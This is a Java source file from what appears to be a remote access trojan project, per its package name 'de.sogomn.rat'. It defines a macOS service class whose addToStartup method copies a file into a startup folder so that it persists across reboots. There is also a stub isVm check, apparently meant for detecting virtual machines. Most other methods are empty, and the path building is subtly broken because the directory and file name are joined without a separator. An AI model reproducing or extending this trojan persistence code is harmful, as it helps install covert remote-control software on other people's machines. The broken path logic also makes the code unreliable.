package de.sogomn.rat.service;

import java.io.File;

import de.sogomn.engine.util.FileUtils;

public final class MacService implements IOperatingSystemService {
	
	private static final String STARTUP_DIRECTORY_PATH ="Macintosh HD" + File.separator + "Library" + File.separator + "Startup";
	
	MacService() {
		//...
	}
	
	@Override
	public void shutDown() {
		//...
	}
	
	@Override
	public void addToStartup(final File file) {
		final String path = STARTUP_DIRECTORY_PATH + file.getName();
		final File destination = new File(path);
		
		FileUtils.copyFile(file, destination);
	}
	
	@Override
	public void removeFromStartup(final String name) {
		//...
	}
	
	public boolean isVm() {
		return false;
	}
	
}
